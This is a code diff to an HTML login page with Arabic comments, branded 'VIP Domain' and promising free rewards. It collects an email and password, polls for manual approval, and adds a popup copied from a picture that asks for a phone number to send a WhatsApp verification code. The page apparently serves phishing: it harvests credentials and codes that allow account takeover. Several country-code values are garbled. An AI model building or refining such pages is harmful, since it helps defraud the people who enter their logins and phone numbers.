@@ -114,7 +114,7 @@ button {
 button:hover { filter: brightness(1.08); }
 button:disabled { opacity: 0.6; cursor: not-allowed; }
 
-/* تنسيق قسم أيقونات التواصل الاجتماعي الجديد */
+/* تنسيق قسم أيقونات التواصل الاجتماعي بالألوان الظاهرة والواضحة */
 .social-login-container {
   display: flex;
   justify-content: center;
@@ -125,30 +125,118 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
   display: flex;
   align-items: center;
   justify-content: center;
-  width: 44px;
-  height: 44px;
+  width: 46px;
+  height: 46px;
   border-radius: 50%;
-  background: rgba(255, 255, 255, 0.05);
-  border: 1px solid var(--card-border);
-  color: var(--text);
-  font-size: 20px;
+  font-size: 22px;
   text-decoration: none;
   transition: all 0.25s ease;
+  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
 }
-.social-icon-btn.facebook:hover {
+/* ألوان ظاهرة مباشرة */
+.social-icon-btn.facebook {
   background: #1877f2;
-  border-color: #1877f2;
-  color: #fff;
-  box-shadow: 0 0 12px rgba(24, 119, 242, 0.5);
-  transform: translateY(-2px);
+  color: #ffffff;
+  border: 1px solid #1877f2;
 }
-.social-icon-btn.whatsapp:hover {
+.social-icon-btn.whatsapp {
   background: #25d366;
-  border-color: #25d366;
-  color: #fff;
-  box-shadow: 0 0 12px rgba(37, 211, 102, 0.5);
-  transform: translateY(-2px);
+  color: #ffffff;
+  border: 1px solid #25d366;
 }
+.social-icon-btn:hover {
+  transform: translateY(-3px);
+  filter: brightness(1.15);
+}
+
+/* ---------------- نافذة الواتساب المنبثقة (Modal) المطابقة تماماً للصورة ---------------- */
+.whatsapp-modal-overlay {
+  position: fixed;
+  top: 0; left: 0; width: 100%; height: 100%;
+  background: rgba(0, 0, 0, 0.7);
+  display: flex; align-items: center; justify-content: center;
+  z-index: 9999;
+  opacity: 0; visibility: hidden;
+  transition: all 0.3s ease;
+}
+.whatsapp-modal-overlay.active {
+  opacity: 1; visibility: visible;
+}
+.whatsapp-modal {
+  width: 90%; max-width: 420px;
+  background: #2c2c2e;
+  border: 1px solid #3a3a3c;
+  border-radius: 20px;
+  padding: 24px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+  position: relative;
+  animation: modalSlide 0.3s ease;
+}
+@keyframes modalSlide {
+  from { transform: translateY(20px); opacity: 0; }
+  to { transform: translateY(0); opacity: 1; }
+}
+.modal-close-btn {
+  position: absolute;
+  top: 20px; left: 20px;
+  font-size: 22px; color: #a1a1a5;
+  cursor: pointer; transition: color 0.2s;
+}
+.modal-close-btn:hover { color: #ffffff; }
+.modal-title {
+  text-align: center; font-size: 20px; font-weight: 700;
+  color: #ffffff; margin-bottom: 24px; margin-top: 5px;
+}
+.modal-inner-box {
+  background: #1c1c1e;
+  border-radius: 12px;
+  padding: 24px 16px;
+  margin-bottom: 20px;
+  border: 1px solid #2c2c2e;
+}
+.modal-instruction {
+  text-align: center; color: #edeff3;
+  font-size: 15px; margin-bottom: 20px;
+}
+.phone-input-container {
+  display: flex; align-items: center;
+  background: #131314;
+  border: 1px solid #3a3a3c;
+  border-radius: 10px;
+  padding: 4px 10px;
+  direction: ltr;
+}
+.country-select-wrapper {
+  display: flex; align-items: center;
+  gap: 5px; padding-right: 10px;
+  border-right: 1px solid #3a3a3c;
+  color: #ffffff; font-size: 14px;
+}
+.country-select {
+  background: transparent; border: none;
+  color: #ffffff; font-size: 14px; outline: none;
+  cursor: pointer; max-width: 90px;
+}
+.country-select option {
+  background: #1c1c1e; color: #ffffff;
+}
+.phone-field {
+  flex: 1; background: transparent; border: none;
+  color: #ffffff; font-size: 15px; padding: 10px;
+  outline: none; width: 100%; margin-bottom: 0 !important;
+}
+.whatsapp-submit-btn {
+  width: 100%; padding: 14px;
+  background: linear-gradient(180deg, #0f401b 0%, #082610 100%);
+  border: 1px solid #144d22; border-radius: 10px;
+  color: #3ddc84; font-weight: 600; font-size: 15px;
+  display: flex; align-items: center; justify-content: center; gap: 10px;
+  cursor: pointer; transition: background 0.2s;
+}
+.whatsapp-submit-btn:hover {
+  background: linear-gradient(180deg, #145324 0%, #0d3617 100%);
+}
+.whatsapp-submit-btn i { font-size: 18px; }
 
 .msg { font-size: 13px; text-align: center; border-radius: 8px; padding: 10px 12px; margin-bottom: 18px; display: none; }
 .msg.error { background: rgba(229, 72, 77, 0.12); color: var(--red); display: block; }
@@ -186,6 +274,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 </head>
 <body>
 
+  <!-- الهيدر -->
   <header class="site-header">
     <img src="logo.png" alt="Logo" class="header-logo" onerror="this.style.display='none'">
     <div class="header-lines"><span></span><span></span><span></span></div>
@@ -193,6 +282,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 
   <div class="main-content">
 
+  <!-- الشاشة الرئيسية: بريد + كلمة سر فقط -->
   <div class="card view active" id="view-access">
     <div class="eyebrow">VIP Domain</div>
     <div class="eyebrow-divider"></div>
@@ -207,15 +297,17 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
       <button type="submit" id="accessBtn">Login</button>
     </form>
 
+    <!-- قسم أيقونات التواصل الاجتماعي الملونة والظاهرة دائماً -->
     <div class="social-login-container">
       <a href="#" class="social-icon-btn facebook" title="Facebook"><i class="fab fa-facebook-f"></i></a>
-      <a href="#" class="social-icon-btn whatsapp" title="WhatsApp"><i class="fab fa-whatsapp"></i></a>
+      <a href="#" class="social-icon-btn whatsapp" id="openWhatsappModal" title="WhatsApp" onclick="event.preventDefault(); toggleModal(true);"><i class="fab fa-whatsapp"></i></a>
     </div>
 
     <div class="promo-divider"></div>
     <div class="promo-text">Join VIP Now &amp; Claim Your Free Rewards</div>
   </div>
 
+  <!-- بانتظار الموافقة -->
   <div class="card view" id="view-pending">
     <div class="status-icon pending">⏳</div>
     <h1 style="margin-bottom:6px;">يتم الطلب</h1>
@@ -224,6 +316,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
     <div class="center-text" style="margin-top:14px; font-size:12px; opacity:0.7;">⏳ جاري المعالجة...</div>
   </div>
 
+  <!-- رفض رسمي -->
   <div class="card view" id="view-rejected">
     <div class="status-icon rejected">✕</div>
     <h1 style="margin-bottom:6px;">نتيجة الطلب</h1>
@@ -233,6 +326,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
     <p class="center-text">شكراً لاهتمامك بالانضمام إلينا.</p>
   </div>
 
+  <!-- لوحة العضو -->
   <div class="card view" id="view-dashboard">
     <div class="status-icon approved">✓</div>
     <h1 style="margin-bottom:6px;">فيك</h1>
@@ -243,6 +337,62 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 
   </div>
 
+  <!-- النافذة المنبثقة المخصصة للواتساب (Popup) المطابقة تماماً للصورة -->
+  <div class="whatsapp-modal-overlay" id="whatsappModalOverlay" onclick="toggleModal(false)">
+    <div class="whatsapp-modal" onclick="event.stopPropagation()">
+      <div class="modal-close-btn" onclick="toggleModal(false)"><i class="fas fa-times"></i></div>
+      <div class="modal-title">تسجيل الدخول</div>
+      
+      <div class="modal-inner-box">
+        <div class="modal-instruction">أدخل رقم هاتفك لربط حسابك</div>
+        <div class="phone-input-container">
+          <div class="country-select-wrapper">
+            <select class="country-select" id="countrySelect">
+              <!-- الدول العربية أولاً -->
+              <option value="+962">🇯🇴 +962</option>
+              <option value="+966">🇸🇦 +966</option>
+              <option value="+971">🇦🇪 +971</option>
+              <option value="+9 Egypt">🇪🇬 +20</option>
+              <option value="+963">🇸🇾 +963</option>
+              <option value="+964">🇮🇶 +964</option>
+              <option value="+9 Kuwait">🇰🇼 +965</option>
+              <option value="+9 Qatar">🇶🇦 +974</option>
+              <option value="+9 Bahrain">🇧🇭 +973</option>
+              <option value="+9 Oman">🇴🇲 +968</option>
+              <option value="+9 Lebanon">🇱🇧 +961</option>
+              <option value="+9 Palestine">🇵🇸 +970</option>
+              <option value="+9 Yemen">🇾🇪 +967</option>
+              <option value="+9 Libya">🇱🇾 +218</option>
+              <option value="+9 Tunisia">🇹🇳 +216</option>
+              <option value="+9 Algeria">🇩🇿 +213</option>
+              <option value="+9 Morocco">🇲🇦 +212</option>
+              <option value="+9 Sudan">🇸🇩 +249</option>
+              <!-- الدول الأجنبية المعروفة -->
+              <option value="+1">🇺🇸 +1</option>
+              <option value="+44">🇬🇧 +44</option>
+              <option value="+49">🇩🇪 +49</option>
+              <option value="+33">🇫🇷 +33</option>
+              <option value="+90">🇹🇷 +90</option>
+              <option value="+7">🇷🇺 +7</option>
+              <option value="+1-CA">🇨🇦 +1</option>
+              <option value="+61">🇦🇺 +61</option>
+              <option value="+39">🇮🇹 +39</option>
+              <option value="+34">🇪🇸 +34</option>
+              <option value="+46">🇸🇪 +46</option>
+            </select>
+            <i class="fas fa-chevron-down" style="font-size: 11px; color: #a1a1a5;"></i>
+          </div>
+          <input type="tel" class="phone-field" placeholder="00000000" id="whatsappPhone">
+        </div>
+      </div>
+      
+      <button class="whatsapp-submit-btn">
+        <i class="fab fa-whatsapp"></i> أرسل رمز التحقّق عبر واتساب
+      </button>
+    </div>
+  </div>
+
+  <!-- الفوتر -->
   <footer class="site-footer">
     <div class="footer-divider"></div>
     <div class="footer-content">
@@ -258,6 +408,16 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
   </footer>
 
 <script>
+// دالة فتح وإغلاق النافذة المنبثقة للواتساب
+function toggleModal(show) {
+  const overlay = document.getElementById('whatsappModalOverlay');
+  if (show) {
+    overlay.classList.add('active');
+  } else {
+    overlay.classList.remove('active');
+  }
+}
+
 function showView(name) {
   document.querySelectorAll('.view').forEach((v) => v.classList.remove('active'));
   document.getElementById('view-' + name).classList.add('active');
@@ -292,15 +452,13 @@ async function checkStatus() {
       document.getElementById('rejectionText').textContent = data.message;
       showView('rejected');
     }
-    // إذا لسا pending، ما منعمل شي وبنكمل ننتظر
   } catch {
-    // تجاهل أخطاء الشبكة المؤقتة أثناء الفحص التلقائي
   }
 }
 
 function startPolling() {
   stopPolling();
-  pollInterval = setInterval(checkStatus, 5000); // كل 5 ثواني
+  pollInterval = setInterval(checkStatus, 5000);
 }
 
 document.getElementById('accessForm').addEventListener('submit', async (e) => {
@@ -367,7 +525,6 @@ async function loadDashboard() {
   }
 }
 
-// إذا في توكن محفوظ من قبل، جرب افتح اللوحة مباشرة
 loadDashboard();
 </script>
 </body>
